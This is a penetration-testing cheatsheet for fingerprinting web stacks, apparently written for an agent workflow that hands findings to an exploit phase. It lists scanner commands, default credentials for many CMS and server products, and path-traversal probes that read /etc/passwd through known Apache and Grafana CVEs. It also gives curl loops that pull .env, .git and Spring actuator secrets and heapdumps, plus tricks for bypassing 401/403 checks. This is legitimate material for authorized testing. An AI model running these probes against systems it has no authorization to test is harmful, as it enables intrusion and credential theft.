# Web Tech Stack Fingerprinting & Scanning — Scanner Cheatsheet

## First-pass fingerprint (run on every web target)
```bash
whatweb -a 1 <URL>            # stealthy ; -a 3 aggressive
webtech -u <URL>
curl -sI <URL>                # headers: Server, X-Powered-By, X-AspNet-Version...
wafw00f <URL>                 # WAF detection (see pentest-tools skill for path)
nikto -h <URL>                # general audit
nuclei -target <URL>          # template scan (templates dir in pentest-tools skill)
```

## Web servers & proxies
### Apache
- Version-specific CVEs: **CVE-2021-41773/42013** path traversal+RCE on Apache 2.4.49/2.4.50:
  probe `curl --path-as-is http://<IP>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd` (read-only probe).
- mod_status exposure: `curl <URL>/server-status`.
- Open source disclosure tricks: try `/.htaccess`, `/.htpasswd` (403 = exists).
### Nginx
- Misconfig classes (flag for Exploit): alias path traversal (`location /imgs` + `alias /path/images/`
  → `<URL>/imgs../secret`), merge_slashes off, raw `$uri` in return/proxy_pass (open redirect/CRLF),
  off-by-slash. Probe: `<URL>/imgs../`, `<URL>/../`, `<URL>//..;/`.
- `nginx -v` style leaks via error pages; version in Server header.
### IIS
- Short-name enumeration (IIS <8): `iis_shortname_scanner`.
- WebDAV PROPFIND: see file-sharing.md. Unicode `..%c0%af` on ancient IIS.
- ASP.NET: `/_layouts/` (SharePoint), `.aspx` ViewState presence.

## CMS & frameworks — fingerprint + default creds + scanners
| Stack | Fingerprint | Default creds | Scanner |
|---|---|---|---|
| WordPress | `/wp-login.php`, `/wp-json/`, `readme.html` version | admin:password etc. | `wpscan --url <URL> -e ap,at,tt,cb,dbe` |
| Drupal | `/user/login`, `CHANGELOG.txt` | admin:admin | `droopescan scan drupal -u <URL>` |
| Joomla | `/administrator/`, `README.txt` | admin:admin | `joomscan -u <URL>` ; droopescan |
| Moodle | `/login/index.php`, `lib/upgrade.txt` | admin:moodle | `droopescan scan moodle -u <URL>` |
| Tomcat | `/manager/html`, `/host-manager`, `favicon` | tomcat:s3cret, manager:manager, admin:admin, tomcat:tomcat, both:changethis | `msf auxiliary/scanner/http/tomcat_mgr_login` |
| JBoss | `/jmx-console/`, `/web-console/`, `/admin-console/` | admin:admin | clusterd ; `msf jboss` modules |
| WebLogic | `/console/` | weblogic:weblogic / welcome1 / oracle | nuclei templates |
| GlassFish | `/theme/` | admin:adminadmin | |
| Spring Boot | `/actuator`, `/env`, `/heapdump`, `/jolokia` | n/a | nuclei `springboot-actuator` ; check `/actuator/env`, `/actuator/heapdump` (INFO LEAK, big finding) |
| Flask/Werkzeug | `/console` | debug console (no pin on old) | If `/console` open → RCE precondition FLAG |
| Django | `/admin/`, debug pages | admin:admin | |
| Laravel | `/telescope`, `/.env` | n/a | `curl <URL>/.env` (secrets leak!) |
| Grafana | `/login` | admin:admin | CVE-2021-43798 path traversal (8.x): probe `/public/plugins/alertlist/../../../../../../../../etc/passwd` (read-only) |
| Zabbix | `/zabbix/` | Admin:zabbix, admin:zabbix | CVE-2022-23131 SAML bypass precondition |
| SharePoint | `/_layouts/`, `/_vti_bin/` | n/a | ToolShell CVE-2025-49704/53770 preconditions — flag versions |
| AEM | `/libs/granite/core/content/login.html`, `X-Dispatcher` header | admin:admin, author:author, replication:replication | `aem-hacker`; probe `/bin/querybuilder.json`, `/system/console`, `/crx/de` |
| Sonarqube | `/api/` | admin:admin | |
| GitLab | `/users/sign_in` | root:5iveL!fe (old) | |
| Jenkins | `/` | n/a | script console `/script` unauth = critical flag |
| Confluence/Jira | `/login.action` | n/a | version-specific CVEs (flag via version) |
| Roundcube | `/` | n/a | CVE-2020-12640 etc. |
| Kibana | `/app/kibana` | n/a | CVE-2019-7609 Timelion RCE precondition (<5.6.15/6.6.1) |
| Splunk | `/` (8000/8089) | admin:changeme | |
| Artifactory | `/artifactory/` | admin:password | |

## Git / source code leakage probes
```bash
for p in .git/config .git/HEAD .env .svn/entries .DS_Store backup.zip wp-config.php.bak robots.txt sitemap.xml crossdomain.xml; do
  curl -sk -o /dev/null -w "%{http_code} $p\n" <URL>/$p
done
```
200 on `.git/config` or `.env` = findings (source/secret leak). Use `git-dumper` for .git.

## PHP info/debug leaks
Probe: `phpinfo.php`, `info.php`, `test.php` (dirsearch finds these), `/_profiler` (Symfony),
`/?XDEBUG_SESSION_START` (xdebug remote connect precondition).

## Apache Tomcat specific
```bash
curl -sk <URL>/manager/html      # 401 → brute creds (authorized)
curl -sk <URL>/host-manager/html
# default WAR deploy via manager = RCE path → hand to Exploit
```
CVE-2020-1938 Ghostcat (AJP 8009) precondition — see misc-services.md AJP.

## Spring Actuators (high yield)
```bash
for ep in health info env beans mappings configprops heapdump threaddump loggers jolokia; do
  curl -sk -o /dev/null -w "%{http_code} /actuator/$ep\n" <URL>/actuator/$ep
done
```
`/env` = secrets; `/heapdump` = credentials in memory (download + flag to Exploit);
`/jolokia` + logback = RCE precondition.

## 401/403 bypass probes (flag responses to Exploit)
```bash
# method fuzz
for m in GET POST PUT DELETE PATCH OPTIONS TRACE HEAD; do curl -sk -o /dev/null -w "$m %{http_code}\n" -X $m <URL>/path; done
# path tricks
<URL>/path/ , <URL>/path/. , <URL>//path , <URL>/./path , <URL>/path%20 , <URL>/path%09 ,
<URL>/path? , <URL>/path..;/ , <URL>/%2e/path , <URL>/path# , <URL>/Path (case)
# header tricks
curl -H "X-Original-URL: /admin" <URL>/ ; curl -H "X-Rewrite-URL: /admin" <URL>/
curl -H "X-Forwarded-For: 127.0.0.1" <URL>/admin
```

## TLS checks
```bash
testssl.sh <IP>:443          # comprehensive; sslscan / sslyze alternatives
```
